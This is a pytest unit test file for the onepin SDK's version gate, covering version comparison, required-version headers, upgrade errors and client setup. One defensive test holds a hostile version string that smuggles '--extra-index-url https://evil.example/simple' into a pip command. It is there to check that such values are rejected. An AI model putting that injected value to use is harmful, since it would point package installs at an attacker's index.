"""Unit tests for the SDK version gate (src/onepin/_version_gate.py)."""

from __future__ import annotations

import httpx
import pytest

from onepin import _version_gate as vg


class TestIsOlder:
    def test_strictly_older(self) -> None:
        assert vg.is_older("0.5.0", "0.6.0") is True

    def test_equal_not_older(self) -> None:
        assert vg.is_older("0.6.0", "0.6.0") is False

    def test_newer_not_older(self) -> None:
        assert vg.is_older("1.0.0", "0.6.0") is False

    def test_prerelease_below_release(self) -> None:
        # A dev build of the same line is older than the final release.
        assert vg.is_older("0.6.0.dev1", "0.6.0") is True

    def test_unparseable_is_not_older(self) -> None:
        assert vg.is_older("not-a-version", "0.6.0") is False


class TestRequiredVersionFrom:
    def test_case_insensitive(self) -> None:
        assert vg.required_version_from({"X-OnePin-Required-Version": "0.7.0"}) == "0.7.0"
        assert vg.required_version_from({"x-onepin-required-version": "0.7.0"}) == "0.7.0"

    def test_missing_and_blank(self) -> None:
        assert vg.required_version_from({}) is None
        assert vg.required_version_from(None) is None
        assert vg.required_version_from({"x-onepin-required-version": "  "}) is None


class TestCheckRequired:
    def test_raises_when_below_floor(self) -> None:
        with pytest.raises(vg.OnePinUpgradeRequiredError) as exc:
            vg.check_required({"x-onepin-required-version": "9.9.9"}, current="0.6.0")
        message = str(exc.value)
        assert "9.9.9" in message
        assert "pip install --upgrade 'onepin>=9.9.9'" in message
        assert exc.value.required == "9.9.9"
        assert exc.value.current == "0.6.0"

    def test_noop_at_or_above_floor(self) -> None:
        vg.check_required({"x-onepin-required-version": "0.6.0"}, current="0.6.0")
        vg.check_required({"x-onepin-required-version": "0.1.0"}, current="0.6.0")

    def test_noop_when_header_absent(self) -> None:
        vg.check_required({}, current="0.6.0")


class TestUpgradeCommand:
    def test_pins_to_floor_when_known(self) -> None:
        assert vg.upgrade_command("0.7.0") == "pip install --upgrade 'onepin>=0.7.0'"

    def test_bare_when_unknown(self) -> None:
        assert vg.upgrade_command() == "pip install --upgrade onepin"

    def test_malicious_version_falls_back_to_unpinned(self) -> None:
        # A hostile/malformed server value must never be interpolated into the shell command.
        evil = "0.5.0' --extra-index-url https://evil.example/simple #"
        assert vg.upgrade_command(evil) == "pip install --upgrade onepin"
        msg = vg.format_upgrade_message(evil)
        assert "evil.example" not in msg
        assert msg.endswith("pip install --upgrade onepin")


class TestMakeClient:
    def test_injects_response_hook_and_user_agent(self) -> None:
        client = vg.make_client(token="op_live_x", base_url="https://dev-api.onepin.ai")
        raw = client._client_wrapper.httpx_client.httpx_client
        assert raw.event_hooks.get("response"), "response hook not installed"
        # User-Agent is corrected to the true installed version (not the codegen-baked default).
        assert client._client_wrapper.get_headers()["User-Agent"] == vg._user_agent()

    def test_respects_caller_httpx_client(self) -> None:
        custom = httpx.Client()
        client = vg.make_client(token="op_live_x", httpx_client=custom)
        assert client._client_wrapper.httpx_client.httpx_client is custom


class TestMakeAsyncClient:
    def test_injects_response_hook_and_user_agent(self) -> None:
        client = vg.make_async_client(token="op_live_x", base_url="https://dev-api.onepin.ai")
        raw = client._client_wrapper.httpx_client.httpx_client
        assert raw.event_hooks.get("response"), "async response hook not installed"
        assert client._client_wrapper.get_headers()["User-Agent"] == vg._user_agent()


class TestPublicReexport:
    def test_top_level_symbols(self) -> None:
        # The gate's public API is re-exported from the package root.
        from onepin import OnePinUpgradeRequiredError, make_async_client, make_client

        assert callable(make_client)
        assert callable(make_async_client)
        assert issubclass(OnePinUpgradeRequiredError, Exception)
